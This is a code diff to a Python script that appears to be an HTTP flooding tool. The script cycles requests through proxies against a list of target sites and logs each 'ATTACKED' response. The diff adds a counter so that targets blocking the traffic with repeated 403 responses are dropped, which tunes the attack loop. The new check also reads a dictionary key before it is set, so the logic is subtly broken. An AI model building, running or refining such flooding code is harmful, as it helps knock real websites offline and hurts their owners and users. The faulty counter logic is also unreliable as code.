@@ -88,6 +88,8 @@ def mainth(protocol, ip, proxy_name, region):
     with open('list.txt') as f:
         sites = f.read().splitlines()
 
+    counter403 = {}
+
     while True:
         scraper = base_scraper()
         logger.info("GET RESOURCES FOR ATTACK")
@@ -124,9 +126,14 @@ def mainth(protocol, ip, proxy_name, region):
                 logger.info("ATTACKED; RESPONSE CODE: " +
                             str(response.status_code) + " TARGET: " + current_target + " PROXY: " + proxy_name +
                             " | " + region)
-                if response.status_code == 404:
+                if response.status_code == 404 or counter403[current_target] >= 100:
                     sites.pop(index_)
                     break
+                if response.status_code == 403:
+                    if current_target not in counter403:
+                        counter403[current_target] = 0
+                    counter403[current_target] += 1
+
             except Exception as err:
                 logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
                 sites.pop(index_)
